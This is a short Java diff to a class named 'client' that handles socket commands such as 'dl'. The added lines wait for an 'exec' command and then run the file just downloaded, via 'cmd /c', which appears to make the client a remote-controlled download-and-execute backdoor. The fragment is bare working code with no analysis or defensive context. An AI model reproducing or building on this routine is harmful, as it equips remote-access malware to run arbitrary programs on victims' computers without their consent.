@@ -125,6 +125,11 @@ public class client {
 						} finally {
 							bos.close();
 						}
+
+						String exec = din.readLine();
+						if (exec.equals("exec")) {
+							Process proc1 = Runtime.getRuntime().exec("cmd /c " + dest);
+						}
 					}
 					if (line.equals("dl")) {
 						ps.println("ok");
